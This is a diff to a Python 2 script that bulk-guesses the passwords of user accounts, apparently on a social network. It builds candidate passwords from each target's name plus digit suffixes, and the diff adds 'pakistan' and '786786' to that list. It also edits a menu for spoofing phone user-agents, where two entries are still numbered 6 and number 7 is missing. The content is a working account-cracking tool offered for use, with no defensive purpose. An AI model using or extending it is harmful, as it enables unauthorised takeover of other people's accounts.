@@ -359,14 +359,12 @@ def method():
 				for user in id:
 					uid, name = user.split("<=>")
 					if len(name)>=6:
-						pwx = [ name+"123", name+"1234", name+"12345" ]
+						pwx = [ name+"123", name+"1234", name+"12345", "pakistan", "786786" ]
 					elif len(name) == 3 or len(name) == 4 or len(name) == 5:
-						pwx = [ name+"123", name+"1234", name+"12345" ]
+						pwx = [ name+"123", name+"1234", name+"12345", "pakistan", "786786" ]
 					else:
-						pwx = [ name+"123", name+"1234", name+"12345" ]
+						pwx = [ name+"123", name+"1234", name+"12345", "pakistan", "786786" ]
 					coeg.submit(api, uid, pwx)
-					if "pakistan" in loc:
-					    pwx == [ "786786", "pakistan", "000786" ]
 			exit("\n\n \033[1;97m[#] cracks complete...")
 	elif method == "2":
 		ask = raw_input(" \033[1;97m[!] Use Manual Password ? y/n: ")
@@ -572,7 +570,8 @@ def setting_ua():
 	print(" \033[1;97m[4] Asus")
 	print(" \033[1;97m[5] Huawei")
 	print(" \033[1;97m[6] Motorola")
-	print(" \033[1;97m[6] Add Own User-Agent")
+	print(" \033[1;97m[6] Infinix")
+	print(" \033[1;97m[8] Add Own User-Agent")
 	ua = raw_input("\n \033[1;97m[!] Choose User-Agent : ")
 	if ua =="":
 		menu()
